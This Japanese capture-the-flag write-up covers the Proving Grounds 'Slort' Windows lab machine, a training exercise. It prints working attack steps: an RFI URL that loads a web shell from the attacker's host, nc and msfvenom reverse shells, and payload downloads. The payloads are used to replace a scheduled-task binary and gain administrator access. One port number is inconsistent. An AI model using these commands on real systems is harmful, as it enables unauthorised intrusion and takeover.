# Proving Grounds Practice - Slort Writeup

**Community Rating:** Intermediate

+++
title = "Proving Grounds Practice - Slort Writeup"
date = "2026-10-29"
description = "XAMPP上のRFI脆弱性からWebシェルを設置して初期アクセスを取得し、スケジュールされたTFTPタスクの実行ファイルを差し替えることで管理者権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Slort]", "[XAMPP]", "[RFI]", "[Web Shell]", "[Scheduled Task]", "[Binary Planting]", "[Privilege Escalation]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Slort |
| OS | Windows 10 (Build 19042) |
| Target IP | 192.168.112.53 |
| Domain/Workgroup | スタンドアロン（ホスト名: SLORT） |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対してサービスバージョン検出とデフォルトスクリプトスキャンを実行する。

```bash
nmap -sV -sC 192.168.112.53
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
8080/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```

4443番ポートと8080番ポートの両方でApache 2.4.43 + PHP 7.4.6が稼働しており、`http-title`から**XAMPP**環境であることが確認できた。また、8080番ポートでは`http-open-proxy`が検出されており、プロキシ設定の不備も疑われる。

FTP（FileZilla）、SMB、MySQLも稼働しているが、まずはWebサービスを起点に調査を進める。

### Directory Enumeration

Gobusterを使用して両方のHTTPポートに対しディレクトリ列挙を行った。

```bash
gobuster dir -u http://192.168.112.53:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://192.168.112.53:4443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

両ポートともほぼ同一の結果となり、`dashboard`、`site`、`img`、`xampp`といったディレクトリが存在することを確認した。

```text
img                  (Status: 301) [--> /img/]
site                 (Status: 301) [--> /site/]
dashboard            (Status: 301) [--> /dashboard/]
xampp                (Status: 301) [--> /xampp/]
```

`site`ディレクトリの中身を確認したところ、以下のパスにアクセス可能であることがわかった。

```text
http://192.168.112.53:4443/Site/index.php?page=main.php
http://192.168.112.53:8080/SITE/index.php?page=main.php
```

`page`パラメータでインクルードするファイルを指定している構造であり、Remote File Inclusion（RFI）の脆弱性が疑われる。

---

## Initial Access

### Remote File Inclusion

Kali側にPHPのWebシェルを設置し、`page`パラメータ経由で外部ホストのファイルを読み込ませることでコードを実行できるか検証した。

```text
http://192.168.112.53:4443/Site/index.php?page=http://192.168.45.155/webshell.php
```

`page`パラメータに攻撃者ホスト上のWebシェルのURLを渡したところ、対象ホスト側でそのままインクルードされ、任意のコマンドを実行できる状態となった。これによりRFIの脆弱性が実証された。

### Reverse Shell

Webシェル経由で、対象ホストに配置済みの`nc.exe`を実行し、Kaliへ接続させた。

Kali側で待ち受けを開始する。

```bash
nc -lvnp 4444
```

Webシェルから以下のコマンドを実行させる。

```cmd
nc.exe 192.168.45.155 4445 -e cmd.exe
```

接続が確立した。

```text
listening on [any] 4444 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.112.53] 50997
Microsoft Windows [Version 10.0.19042.1387]

C:\xampp\htdocs\site>
```

これにより、対象ホスト上でコマンドを実行できるシェルを取得した。

### Local Flag

ユーザーディレクトリのデスクトップに配置されていたフラグファイルを確認した。

```cmd
C:\Users\rupert\Desktop>type local.txt
```

---

## Privilege Escalation

### Enumeration

権限昇格の糸口を探るため、winPEASを転送して自動列挙を行った。

```powershell
iwr -uri http://192.168.45.155:80/winPEASx64.exe -Outfile winPEASx64.exe
```

また、`whoami /priv`で付与されている特権も確認したが、悪用可能な特権は見当たらなかった。

```text
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
（その他の特権はすべてDisabled）
```

次に、ルート直下の`backup`フォルダのアクセス許可を確認したところ、`BUILTIN\Users`に対してフルコントロール権限が付与されていることがわかった。

```cmd
C:\>icacls backup
backup BUILTIN\Users:(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
```

一般ユーザーでも`C:\Backup`配下のファイルを自由に書き換えられる状態であることが確認できた。

### Scheduled Task の発見

`C:\Backup\info.txt`を確認したところ、TFTPクライアントを使用した定期タスクの説明が記載されていた。

```cmd
C:\Backup>type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

このことから、5分おきに`C:\Backup\TFTP.EXE`が（おそらく高い権限を持つプロセスとして）実行されていることがわかった。前述のとおり`C:\Backup`には書き込み権限があるため、**この実行ファイルを悪意のあるバイナリに差し替えることで、スケジュールタスク実行時に任意コードを実行させられる**と考えられる。

### Binary Planting による権限昇格

まず、正規の`TFTP.EXE`を退避させる。

```cmd
C:\Backup>move TFTP.exe TFTP1.exe
        1 file(s) moved.
```

Kali側でリバースシェルのペイロードを、同名の`TFTP.EXE`として生成する。

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4445 -f exe -o TFTP.EXE
```

生成したペイロードを対象ホストの`C:\Backup`に転送する。

```powershell
PS C:\Backup> iwr -uri http://192.168.45.155:80/TFTP.EXE -Outfile TFTP.EXE
```

Kali側でリスナーを起動し、スケジュールタスクの実行（最大5分）を待つ。

```bash
nc -lvnp 4445
```

数分後、接続が確立された。

```text
listening on [any] 4445 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.112.53] 51137
Microsoft Windows [Version 10.0.19042.1387]

C:\WINDOWS\system32>whoami
slort\administrator
```

スケジュールタスクが高権限（管理者権限）で`TFTP.EXE`を実行していたため、差し替えたペイロードがその権限で起動し、`slort\administrator`としてのシェルを取得できた。

---

## Summary

今回の調査では、XAMPP上で稼働するWebアプリケーションの`page`パラメータにRemote File Inclusion（RFI）の脆弱性が存在し、外部ホストに設置したWebシェルをインクルードすることで初期アクセスを取得した。

その後の列挙で、`C:\Backup`ディレクトリに対して一般ユーザーが書き込み可能であること、かつそのディレクトリ内の`TFTP.EXE`が5分おきに実行される定期タスクの対象になっていることを発見した。正規の実行ファイルを悪意のあるリバースシェルペイロードに差し替える**バイナリ置換（Binary Planting）**の手法により、スケジュールタスク実行時に管理者権限でのシェルを取得することに成功した。

攻略の進捗は以下のとおり。

1. Nmapによるポート・サービス列挙（XAMPP環境を確認）
2. GobusterによるWebディレクトリ列挙
3. `page`パラメータのRFI脆弱性を利用したWebシェルの設置
4. nc.exe経由でのリバースシェルによる初期アクセス
5. ローカルフラグの取得
6. `icacls`による`C:\Backup`の書き込み権限の発見
7. `info.txt`からTFTP定期タスクの存在を確認
8. 正規`TFTP.EXE`の退避とmsfvenomペイロードへの差し替え
9. スケジュールタスク実行時の管理者権限シェル取得
